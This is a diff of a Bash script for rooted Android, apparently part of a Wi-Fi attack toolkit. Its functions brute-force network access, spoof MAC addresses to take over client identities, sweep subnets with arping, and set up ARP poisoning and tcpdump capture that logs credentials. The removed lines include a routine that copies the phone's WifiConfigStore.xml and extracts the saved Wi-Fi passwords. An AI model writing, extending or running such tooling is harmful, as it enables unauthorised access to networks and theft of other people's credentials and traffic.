 																			{ stdin="${home_dir}/logs/tmp"; _parse_html; }
-																			_json_addressgid "${request_addr}" "tclients"
-																			echo -n>"${home_dir}/logs/creds_${obf_date}.log"
 																			play-audio "$home_dir/sfx/notification_done.m4a" &
 																			[ "${acbd18db4cc2f85cedef654fccc4a4d8}" = "1" ] || break
 																		elif [[ "${c}" =~ "failed: Connection refused" ]]; then
+																			admins+=" ${x}"
 																			n=$((n+1))
 																			{ stdin="${home_dir}/logs/tmp"; _parse_html; }
-																			_json_addressgid "${request_addr}" "admins"
 																			play-audio "$home_dir/sfx/notification_done.m4a" &
 																			[ "${acbd18db4cc2f85cedef654fccc4a4d8}" = "1" ] || break
 																		elif [ ! -s "${home_dir}/logs/tmp" ]; then
-																			_echo "\t\t_wificonnect_bruteforce --> error requested address returned null: [request_addr](${request_addr}) [result](${c})" 0
+																			_echo "\t\t_wificonnect_bruteforce --> error requested address returned null: [request_addr](${x}) [result](${c})" 0
 																		else
 																			_echo "\t\t_wificonnect_bruteforce --> error could not determine status: ${c}" 0
 																			c="${home_dir}/logs/wifistatus_$(date +%s).log"
@@ -1165,7 +1120,6 @@
 																{
 																		local i
 																		_echo "- Startting survival Wi-Fi connection:" 1
-																		{ _wificonnect_getpsk; _json_initconfig || return 1; _json_networkpskauto; }
 																		i=0; _wificonnect_select || return 1
 																		su -c 'killall watch 2>/dev/null' &>/dev/null &
 																	while true; do
@@ -1246,26 +1200,21 @@
 																}
 											_wificonnect_wsconfig()
 																{
-																	if [ -s "${home_dir}/logs/_init_new_ws.log" ] || [ -z "${ws_disconnect_alt}" ] || [ -z "${ws_interface_allows}" ] || [ -z "${ws_macchanger_alt}" ]; then
-																		sudo "${home_dir}/plugins/wsconfig.sh"
-																		echo -n>"${home_dir}/logs/_init_new_ws.log"
-																		source "${home_dir}/.wsprofile"
-																		echo >"${home_dir}/logs/_init_env.log"
+																	if [ -s "${home_dir}/logs/_init_new_ws.log" ]; then
+																			# setting ws_disconnect_alt to 1 will not work properly on some devices
+																		if (["${ws_disconnect_alt}" = "1" ] || \
+																			[ -z "${ws_disconnect_alt}" ] || \
+																			[ -z "${ws_interface_allows}" ] || \
+																			[ -z "${ws_macchanger_alt}" ]); then
+																			sudo "${home_dir}/plugins/wsconfig.sh"
+																			echo -n>"${home_dir}/logs/_init_new_ws.log"
+																			source "${home_dir}/.wsprofile"
+																		else
+																			echo -n>"${home_dir}/logs/_init_new_ws.log"
+																		fi
+																	else
+																		return 0
 																	fi
-																}
-											_wificonnect_getpsk()
-																{
-																		local u x y f tmp
-																		unset list_psk_json
-																		f="/data/misc/apexdata/com.android.wifi/WifiConfigStore.xml"
-																		tmp="${home_dir}/logs/tmp"
-																		su -c 'cp '${f}' '${tmp}''
-																	while read -r u; do
-																		[ -z "$x" ] && x="\"${u}\"" && continue
-																		y="\"${u}\""; [ -z "${list_psk_json}" ] && list_psk_json="${x}:[${y}]" || list_psk_json="${list_psk_json},${x}:[${y}]"
-																		unset x; continue
-																	done< <(cat "$tmp" | grep -FB1 "<string name=\"PreSharedKey\">" | sed 's|<string name="SSID">&quot;||g; s|<string name="PreSharedKey">&quot;||g; s|&quot;</string>||g; s|&amp;|&|g; s|'\''|\&squot\;|g; s|\\\\|&bslash;|g; /^--$/d')
-																		echo "{${list_psk_json}}" | jq -e . &>/dev/null || { d="$(date +%s)"; x="${home_dir}/logs/wifipsk_${d}.log"; _echo "\t\t_wificonnect_getpsk --> error could not parse psk: [list_psk_json](${list_psk_json})" 0; _echo "\t\t_wificonnect_getpsk --> saving file into: ${x}" 0; cp "${tmp}" "${x}" 2>/dev/null; }
 																}
 											_wificonnect_autoscan()
 																{
@@ -1285,10 +1234,9 @@
 																							fi
 																								_echo "\t\t_autoscan_getinfo --> returned result: [ssid](${ssid}) [bssid](${bssid}) [sec](${sec}) [arp-scan](${result})" 0
 																								_echo "\t${color_warn}Result: ${result}${color_reset}" 1
-																								{ _json_initconfig || return 1; _json_networkinfo; _json_networkgid; _json_networkclients; }
+																								{ _json_initconfig && _json_networkclients; }
 																						}
 																		local t i ssid bssid sec total t result stat procc
-																		{ _wificonnect_getpsk; _json_initconfig || return 1; _json_networkpskauto; }
 																		[ "${1}" = "pin" ] && echo -n>"${home_dir}/logs/bssidx.log"
 																		mode="auto"; stat=(0 0 0)
 																		_wificonnect_status "is_disconnected" || return 1
@@ -1297,7 +1245,7 @@
 																	while true; do
 																			_echo "- Running ${1} network discovery: $(date +%r)" 1
 																			_wificonnect_status "is_disabled" || return 1
-																			{ _wificonnect_getinfo || continue; _json_initconfig || return 1; _json_networkinfoauto; }
+																			_wificonnect_getinfo || continue
 																				[ "${1}" = "pin" ] && echo "${bssid_list[@]}" >>"${home_dir}/logs/bssidx.log"
 																				i=0; total="${#bssid_list[@]}"; t=1
 																		while true; do
@@ -1325,18 +1273,18 @@
 																			fi
 																	done
 																}
-												local u x err
+												local u x err d
 												_source_plugin "${home_dir}/plugins/connection-status.sh" || return 1
-											if  [ "$1" = "quick_setaddr" ]; then
-												_wificonnect_status "get_wifi_info"; err=${?}
-												if [ ${err} -eq 0 ]; then
-													_wificonnect_status "is_disconnected"
-													_macchanger_set "${2}" || return 1
-													_wificonnect_connect "${ssid}" "${sec}" || return 1
-												else
-													_macchanger_set "${2}" || return 1
-												fi
-												return ${err}
+											if  [ "${1}" = "quick_setaddr" ]; then
+												[ "${2: -1}" = "," ] && d="${2:0: -1}" || d="${2}"
+												_wificonnect_status "get_wifi_info" || { _macchanger_set "${d}"; return ${?}; }
+												_wificonnect_status "is_disconnected" || return ${?}
+												_macchanger_set "${d}" || return ${?}
+												_wificonnect_connect "${ssid}" "${sec}" || return ${?}
+												return 0
+											elif [ "${1}" = "reconnect" ]; then
+												_wificonnect_status "reconnect" || return ${?}
+												return 0
 											fi
 												_echo "- Startting connect mode:" 1
 
@@ -1347,8 +1295,6 @@
 												_wificonnect_autoscan "auto"
 											elif  [ "$1" = "f" ]; then
 												_wificonnect_autoscan "fast"
-											elif  [ "$1" = "p" ]; then
-												_wificonnect_autoscan "pin"
 											elif  [ "$1" = "c" ]; then
 												wifi_force_select="yes"
 												_wificonnect_select || return 1
@@ -1356,11 +1302,13 @@
 											elif  [ "$1" = "s" ]; then
 												_wificonnect_survival
 											elif  [ "$1" = "n" ]; then
-												_wificonnect_getinfo || return 1
-												parse_gid_mode="index"
-												_wificonnect_getclients
-											elif  [ "$1" = "x" ] || [ "$1" = "xx" ]; then
-												[ "$1" = "xx" ] && parse_gid_mode="position" || parse_gid_mode="seperate"
+												_wificonnect_select || return 1
+												_wificonnect_status "is_disconnected" || return 1
+												_macchanger_set "--random" || return 1
+												_wificonnect_connect "${ssid}" "${sec}" "${bssid}" || return 1
+												_wificonnect_getgid || return 1
+												_wificonnect_getclients || return 1
+											elif  [ "$1" = "x" ]; then
 												_wificonnect_bruteforce || return 1
 											elif  [ "$1" = "t" ]; then
 												_wificonnect_test
@@ -1375,6 +1323,7 @@
 												_echo "- Startting arping scan:" 1
 												[ -z "$gateway" ] && { _echo "\tError missing gateway variable" 1; return 1; }
 												prev=0; i=0; addr=(${gateway//\./ }); addr="${addr[0]}.${addr[1]}.${addr[2]}"
+												unset clients
 											until [ $i -ge 255 ]; do
 													i=$((i+1)); _echo "\tWaiting reply from: ${addr}.${i}" 1
 													arr=($(su -c 'timeout -k3 3 '${prefix}'/arping -i '${iface}' -rRC1 '${addr}'.'${i}' 2>&1 | tr '\n' ' ''))
@@ -1412,6 +1361,7 @@
 												else
 													unset arg
 												fi
+												unset clients
 											while read x; do
 												([ -z "${x}" ] || [[ "${x}" =~ (data|statistics|\.) ]] || [ ${#x} -le 1 ]) && continue
 												x="${x:0: -1}"; [[ "${list}" =~ "${x}" ]] && continue || list+=" ${x}"
@@ -1717,6 +1667,7 @@
 
 																	list_clients+=" $sender_mac"
 																	list_clients+=" $receiver_mac"
+																	clients+=" ${sender_mac} ${receiver_mac}"
 																if [ "$capture_mode" = "3" ]; then
 																	_echo "\t\t_process_tcpdump --> skipping since mode is ndp" 0
 																	return 0
@@ -1761,10 +1712,10 @@
 														tcpdump="$prefix/tcpdump -i ${iface} --print -#netqNlUw"
 														filters="arp or (port 67 or port 68) or (tcp and dst port 80) or (udp and dst 255.255.255.255 and port 5678 or port 10001 or port 10002)"
 													if [ "$capture_mode" = "1" ]; then
-														unset list_clients
+														unset list_clients clients
 													elif [ "$capture_mode" = "2" ]; then
 														_configure_arppoison || return 1
-														unset list_clients list_creds
+														unset list_clients clients
 													elif [ "$capture_mode" = "4" ]; then
 														_configure_ndp || return 1
 														unset list_ndp
